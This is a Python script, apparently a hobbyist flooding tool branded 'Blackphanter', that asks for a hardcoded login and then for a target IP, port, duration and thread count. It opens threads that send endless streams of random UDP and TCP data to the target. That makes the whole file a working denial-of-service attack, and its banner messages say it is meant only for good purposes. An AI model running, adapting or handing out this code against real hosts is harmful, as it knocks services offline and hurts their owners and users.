# -*- coding: utf-8 -*-
import random
import socket
import os
import sys
import logging
import threading
import time


# Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

os.system("clear")
os.system("https://github.com/Kodekeras24")
print("\033[37mWelcome to Zona Blackphanter\033[0m")
time.sleep(2)
print("Loading.......")

attemps = 0
os.system("clear")
print("")
print("\033[95m        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @  \033[0m")
print("\033[95m        @         @  @      @         @   @        @     @    \033[0m")
print("\033[95m        @         @  @       @       @   @         @   @      \033[0m")
print("\033[31m        @ @ @ @ @    @        @     @    @         @ @        \033[0m")
print("\033[31m        @         @  @         @   @     @         @   @      \033[0m")   
print("\033[31m        @         @  @          @ @       @        @     @    \033[0m")
print("\033[31m        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @  \033[0m")
print("")     
print("\033[91m      @ @ @      @ @   @     @ @ @ @ @ @     @  @ @ @  @ @ @    \033[0m")
print("\033[91m            @  @     @ @ @   @    @    @     @  @      @     @  \033[0m")
print("\033[94m      @ @ @    @ @ @ @ @   @ @    @    @ @ @ @  @ @ @  @ @ @    \033[0m")
print("\033[94m      @        @     @ @     @    @    @     @  @ @ @  @     @  \033[0m")
print("")
print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—__\033[0m")
print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES                      \033[0m")
print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__—\033[0m")

while attemps < 100:
    username = input("\033[32mEnter your username: \033[0m")
    password = input("\033[31mEnter your password: \033[0m")

    if username == 'bp4' and password == 'bp4':
        print("\033[97m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

ip = str(input("\033[95m Target IP :\033[0m"))
port = int(input("\033[94m Target Port :\033[0m"))
choice = str(input("\033[31m (y/n) :\033[0m"))
times = int(input("\033[33m Time :\033[0m"))
threads = int(input("\033[37m Threads :\033[0m"))

time.sleep(5),
print("\033[33m  ⟩⟩  SCRIPT INI... \033[0m "),
time.sleep(5),
print("\033[32m  ⟩⟩  HANYA BOLEH KAU GUNAKAN \033[0m "),
time.sleep(5),
print("\033[91m  ⟩⟩  UNTUK MEMBERANTAS \033[0m "),
time.sleep(5),
print("\033[98m  ⟩⟩  BAKTERI YG MERUGIKAN KEHIDUPAN \033[0m "),
time.sleep(5),
print("\033[96m  ⟩⟩  MERUSAK MORAL AGAMA & BANGSA \033[0m "),
time.sleep(5),
print("\033[95m  ⟩⟩  SERTA MEMBELA YG TERTINDAS..! \033[0m "),
time.sleep(5),

def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("[+]  \033[32mAttack Sent!!!\033[0m")
		except:
			print("[-] Error!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[+]  \033[32mAttack Sent!!!\033[0m")
		except:
			s.close()
			print("[*] Error!!!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[+]  \033[32mAttack Sent!!!\033[0m")
		except:
			s.close()
			print("[*] Error!!!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[+]  \033[32mAttack Sent!!!\033[0m")
		except:
			s.close()
			print("[*] Error!!!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
